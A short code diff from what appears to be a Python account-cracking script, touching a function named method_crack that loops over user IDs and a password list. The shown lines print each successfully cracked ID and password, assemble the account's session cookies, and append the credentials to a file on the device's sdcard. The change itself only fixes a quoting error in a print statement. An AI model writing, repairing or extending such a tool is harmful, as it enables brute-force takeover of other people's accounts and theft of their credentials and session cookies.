@@ -115,7 +115,7 @@ def method_crack(ids,passlist):
                 if str(uid) in oks:
                     break
                 else:
-                    print('\r\r \033[1;32m['SBsb-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    print('\r\r \033[1;32m[SBsb-OK] ' +str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                     print('\033[1;32m [COOKIES] '+coki)
                     open('/sdcard/SBsb-OK.txt','a').write(str(uid)+' | '+pas+'\n')
